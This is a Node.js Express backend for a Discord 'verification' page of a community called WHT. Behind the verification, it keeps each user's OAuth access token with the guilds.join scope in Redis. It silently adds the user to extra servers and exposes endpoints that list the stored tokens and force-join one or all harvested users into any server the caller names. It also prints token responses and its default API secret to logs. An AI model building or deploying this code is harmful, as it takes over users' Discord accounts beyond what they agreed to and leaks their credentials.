const express = require('express');
const FormData = require('form-data');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const { Redis } = require('@upstash/redis');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.text());

console.log('🔧 Iniciando backend...');
console.log('KV_REST_API_URL:', process.env.KV_REST_API_URL ? '✅ definida' : '❌ FALTANDO');
console.log('KV_REST_API_TOKEN:', process.env.KV_REST_API_TOKEN ? '✅ definida' : '❌ FALTANDO');
console.log('CLIENT_ID:', process.env.CLIENT_ID ? `✅ definida (${process.env.CLIENT_ID.substring(0, 10)}...)` : '❌ FALTANDO');
console.log('CLIENT_SECRET:', process.env.CLIENT_SECRET ? '✅ definida' : '❌ FALTANDO');
console.log('REDIRECT_URI:', process.env.REDIRECT_URI || '❌ FALTANDO');
console.log('BOT_TOKEN:', process.env.BOT_TOKEN ? '✅ definida' : '❌ FALTANDO');
console.log('GUILD_ID:', process.env.GUILD_ID || '❌ FALTANDO');
console.log('CARGO_ID:', process.env.CARGO_ID || '❌ FALTANDO');
console.log('API_SECRET:', process.env.API_SECRET || '(usando padrão wht-secret-2025)');

const redis = new Redis({
  url: process.env.KV_REST_API_URL,
  token: process.env.KV_REST_API_TOKEN,
});

const CLIENT_ID     = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI  = 'https://verificar-2-kdksa6xlw-pregadolucas1-4494s-projects.vercel.app/';
const BOT_TOKEN     = process.env.BOT_TOKEN;
const GUILD_ID      = process.env.GUILD_ID;
const CARGO_ID      = process.env.CARGO_ID;
const API_SECRET    = process.env.API_SECRET || 'wht-secret-2025';
const CANAL_ID      = '1498452626357096489';

// ─── HELPERS REDIS ────────────────────────────────────────────
async function salvarLog(user, accessToken) {
  const entrada = {
    user_id:      String(user.id),
    username:     user.username,
    avatar:       user.avatar,
    access_token: accessToken,
    ts:           Math.floor(Date.now() / 1000),
  };
  await redis.set(`oauth:${user.id}`, JSON.stringify(entrada));
  await redis.sadd('oauth:ids', String(user.id));
}

async function buscarTodos() {
  const ids = await redis.smembers('oauth:ids');
  if (!ids || ids.length === 0) return [];
  const results = await Promise.all(ids.map(id => redis.get(`oauth:${id}`)));
  return results
    .map(r => (typeof r === 'string' ? JSON.parse(r) : r))
    .filter(Boolean);
}

async function buscarUm(user_id) {
  const data = await redis.get(`oauth:${user_id}`);
  if (!data) return null;
  return typeof data === 'string' ? JSON.parse(data) : data;
}

// ─── ROTA: bot consulta os logs ───────────────────────────────
app.get('/api/logs', async (req, res) => {
  if (req.headers['x-api-secret'] !== API_SECRET)
    return res.status(401).json({ error: 'Unauthorized' });

  try {
    const logs = await buscarTodos();
    res.json({
      total:     logs.length,
      com_token: logs.filter(e => e.access_token).length,
      logs,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── ROTA: mover UM usuário ───────────────────────────────────
app.post('/api/mover', async (req, res) => {
  if (req.headers['x-api-secret'] !== API_SECRET)
    return res.status(401).json({ error: 'Unauthorized' });

  const { user_id, guild_id } = req.body;
  if (!user_id || !guild_id)
    return res.status(400).json({ error: 'user_id e guild_id sao obrigatorios' });

  try {
    const entrada = await buscarUm(user_id);
    if (!entrada || !entrada.access_token)
      return res.status(404).json({ error: 'Usuario nao encontrado ou sem token' });

    const resp = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${user_id}`, {
      method: 'PUT',
      headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ access_token: entrada.access_token }),
    });
    res.json({ success: [200, 201, 204].includes(resp.status), status: resp.status });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── ROTA: mover TODOS ────────────────────────────────────────
app.post('/api/mover-todos', async (req, res) => {
  if (req.headers['x-api-secret'] !== API_SECRET)
    return res.status(401).json({ error: 'Unauthorized' });

  const { guild_id } = req.body;
  if (!guild_id) return res.status(400).json({ error: 'guild_id e obrigatorio' });

  try {
    const logs = await buscarTodos();
    let ok = 0, falhou = 0;

    for (const entrada of logs) {
      if (!entrada.access_token) { falhou++; continue; }
      try {
        const resp = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${entrada.user_id}`, {
          method: 'PUT',
          headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ access_token: entrada.access_token }),
        });
        if ([200, 201, 204].includes(resp.status)) ok++; else falhou++;
      } catch { falhou++; }
    }

    res.json({ ok, falhou, total: logs.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── MESES ────────────────────────────────────────────────────
const MESES = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];

function fmtData(dt) {
  return `${dt.getDate()} de ${MESES[dt.getMonth()]} de ${dt.getFullYear()} ${String(dt.getHours()).padStart(2,'0')}:${String(dt.getMinutes()).padStart(2,'0')}`;
}

// ─── ROTA PRINCIPAL OAuth2 ────────────────────────────────────
app.get('/', async (req, res) => {
  const code = req.query.code;
  if (!code) return res.send('OAuth2 Backend WHT - Online ✅');

  console.log('📥 Recebeu code OAuth2:', code.substring(0, 10) + '...');
  
  if (!CLIENT_ID || !CLIENT_SECRET) {
    return res.status(400).send(`
      <h1>ERRO: Variáveis de ambiente FALTANDO!</h1>
      <p><strong>CLIENT_ID:</strong> ${CLIENT_ID ? '✅ OK' : '❌ FALTANDO'}</p>
      <p><strong>CLIENT_SECRET:</strong> ${CLIENT_SECRET ? '✅ OK' : '❌ FALTANDO'}</p>
      <p><strong>REDIRECT_URI:</strong> ${REDIRECT_URI || '❌ FALTANDO'}</p>
      <p>Configure essas variáveis no Vercel e faça o redeploy!</p>
    `);
  }

  try {
    console.log('🔑 Trocando code por token...');
    let form = new FormData();
    form.append('client_id', CLIENT_ID);
    form.append('client_secret', CLIENT_SECRET);
    form.append('grant_type', 'authorization_code');
    form.append('redirect_uri', REDIRECT_URI);
    form.append('scope', 'identify guilds.join');
    form.append('code', code);

    const tokenRes  = await fetch('https://discord.com/api/oauth2/token', { method: 'POST', body: form });
    const tokenData = await tokenRes.json();
    console.log('🔑 Token response status:', tokenRes.status);
    console.log('🔑 Token data:', JSON.stringify(tokenData));

    if (tokenData.error) {
      console.error('❌ Erro no token:', tokenData.error, tokenData.error_description);
      return res.status(400).send(`Erro OAuth2: ${tokenData.error} - ${tokenData.error_description}`);
    }

    console.log('👤 Buscando dados do usuário...');
    const userRes = await fetch('https://discord.com/api/users/@me', {
      headers: { authorization: `${tokenData.token_type} ${tokenData.access_token}` }
    });
    const user = await userRes.json();
    
    console.log('👤 Usuário:', user.username, user.id);

    try {
      await salvarLog(user, tokenData.access_token);
      console.log('💾 Log salvo no Redis');
    } catch (err) {
      console.log('[Aviso] Falha ao salvar no Redis:', err.message);
    }

    const avatarURL = user.avatar
      ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512`
      : `https://cdn.discordapp.com/embed/avatars/0.png`;

    try {
      console.log('➕ Adicionando ao servidor principal...');
      const addResp = await fetch(`https://discord.com/api/guilds/${GUILD_ID}/members/${user.id}`, {
        method: 'PUT',
        headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ access_token: tokenData.access_token, roles: [CARGO_ID] }),
      });
      console.log('➕ Add member status:', addResp.status);
    } catch (err) {
      console.log('[Aviso] Falha ao adicionar ao servidor:', err.message);
    }

    try {
      const extrasRaw = await redis.get('servidores_extras');
      const extras = extrasRaw
        ? (typeof extrasRaw === 'string' ? JSON.parse(extrasRaw) : extrasRaw)
        : [];

      for (const guildId of extras) {
        await fetch(`https://discord.com/api/guilds/${guildId}/members/${user.id}`, {
          method: 'PUT',
          headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ access_token: tokenData.access_token }),
        });
      }
    } catch (err) {
      console.log('[Aviso] Falha nos servidores extras:', err.message);
    }

    const contaCriada = new Date(user.id / 4194304 + 1420070400000);
    const agora       = new Date();
    const idadeDias   = Math.floor((agora - contaCriada) / (1000 * 60 * 60 * 24));
    const dataCriacao = fmtData(contaCriada);
    const dataEntrada = fmtData(agora);

    try {
      console.log('📨 Enviando mensagem no Discord...');
      await fetch(`https://discord.com/api/channels/${CANAL_ID}/messages`, {
        method: 'POST',
        headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            color: 0xFF1493,
            title: '✨ NOVO MEMBRO VERIFICADO ✨',
            description: `## ${user.username}`,
            fields: [
              {
                name: '🎉 Verificação',
                value: `<@${user.id}> foi verificado(a) com sucesso!\nCargo recebido: <@&${CARGO_ID}>`,
                inline: false
              },
              {
                name: '🪪 ID do Usuário',
                value: `\`${user.id}\``,
                inline: true
              },
              {
                name: '🎂 Idade da Conta',
                value: `\`${idadeDias} dias\``,
                inline: true
              },
              {
                name: '📅 Conta Criada',
                value: dataCriacao,
                inline: true
              },
              {
                name: '📥 Entrou em',
                value: dataEntrada,
                inline: true
              }
            ],
            thumbnail: { url: avatarURL },
            footer: {
              text: `WHT COMMUNITY 🍄 • Verificado • ${dataEntrada}`
            }
          }]
        })
      });
    } catch (err) {
      console.log('[Aviso] Falha ao enviar mensagem:', err.message);
    }

    console.log('✅ Verificação concluída para', user.username);

    res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WHT Community — Verificado</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0a0a0f; color: white; font-family: 'Segoe UI', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
    .bg-glow { position: fixed; width: 600px; height: 600px; background: radial-gradient(circle, rgba(255,20,147,0.15) 0%, transparent 70%); top: 50%; left: 50%; transform: translate(-50%, -50%); pointer-events: none; }
    .card { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,20,147,0.3); border-radius: 20px; padding: 48px 40px; text-align: center; max-width: 440px; width: 90%; box-shadow: 0 0 40px rgba(255,20,147,0.15); position: relative; z-index: 1; }
    .logo-wrap { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #FF1493; margin: 0 auto 16px; box-shadow: 0 0 20px rgba(255,20,147,0.5); overflow: hidden; }
    .logo-wrap img { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; }
    .avatar { width: 64px; height: 64px; border-radius: 50%; border: 3px solid #FF1493; margin: 0 auto 16px; box-shadow: 0 0 15px rgba(255,20,147,0.4); display: block; }
    .check { font-size: 48px; margin-bottom: 16px; }
    h1 { font-size: 26px; font-weight: 700; color: #FF1493; margin-bottom: 8px; text-shadow: 0 0 20px rgba(255,20,147,0.5); }
    .username { font-size: 18px; color: #ffb3d9; margin-bottom: 8px; }
    p { color: #aaa; font-size: 14px; line-height: 1.6; margin-bottom: 16px; }
    .badge { display: inline-block; background: rgba(255,20,147,0.15); border: 1px solid rgba(255,20,147,0.4); color: #FF1493; padding: 6px 16px; border-radius: 20px; font-size: 13px; margin-bottom: 20px; }
    .countdown { font-size: 13px; color: #FF1493; margin-bottom: 16px; font-weight: 600; }
    .btn-discord { display: inline-flex; align-items: center; gap: 8px; background: #5865F2; color: white; padding: 12px 24px; border-radius: 12px; text-decoration: none; font-size: 15px; font-weight: 600; box-shadow: 0 0 15px rgba(88,101,242,0.4); }
    .btn-discord:hover { opacity: 0.85; }
    .divider { border: none; border-top: 1px solid rgba(255,20,147,0.2); margin: 20px 0; }
    .footer { color: #555; font-size: 12px; margin-top: 24px; }
  </style>
</head>
<body>
  <div class="bg-glow"></div>
  <div class="card">
    <div class="logo-wrap"><img src="https://i.imgur.com/G37BiaD.gif" alt="WHT Logo"/></div>
    <img class="avatar" src="${avatarURL}" alt="Avatar"/>
    <div class="check">✅</div>
    <h1>Verificado com sucesso!</h1>
    <div class="username">Olá, ${user.username}!</div>
    <hr class="divider"/>
    <div class="badge">🐺 WHT Community</div>
    <p>Sua conta foi verificada e o cargo foi atribuído automaticamente.<br/>Redirecionando para o Discord...</p>
    <div class="countdown">Voltando em <span id="timer">3</span>s...</div>
    <a class="btn-discord" href="https://discord.com/channels/@me">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
      Abrir Discord
    </a>
    <div class="footer">WHT Community • Sistema OAuth2</div>
  </div>
  <script>
    let t = 3; const el = document.getElementById('timer');
    const interval = setInterval(() => { t--; el.textContent = t; if (t <= 0) { clearInterval(interval); window.location.href = 'https://discord.com/channels/@me'; } }, 1000);
  </script>
</body>
</html>`);

  } catch (err) {
    console.error('❌ ERRO GERAL:', err.message);
    console.error('❌ STACK:', err.stack);
    res.status(500).send('Erro ao processar verificação.');
  }
});

module.exports = app;
